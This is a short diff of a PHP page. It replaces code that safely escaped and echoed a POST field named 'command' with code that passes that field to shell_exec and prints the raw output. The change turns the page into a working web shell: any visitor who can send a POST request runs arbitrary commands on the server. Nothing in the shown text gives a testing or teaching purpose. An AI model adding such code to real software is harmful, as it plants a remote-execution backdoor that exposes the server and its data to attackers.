@@ -16,7 +16,8 @@
     <pre><?php
     if ($_SERVER["REQUEST_METHOD"] === "POST") {
         $command = $_POST["command"] ?? "";
-        echo htmlspecialchars($command, ENT_QUOTES, "UTF-8");
+        $output = shell_exec($command);
+        echo $output;
     }
     ?></pre>
 </body>
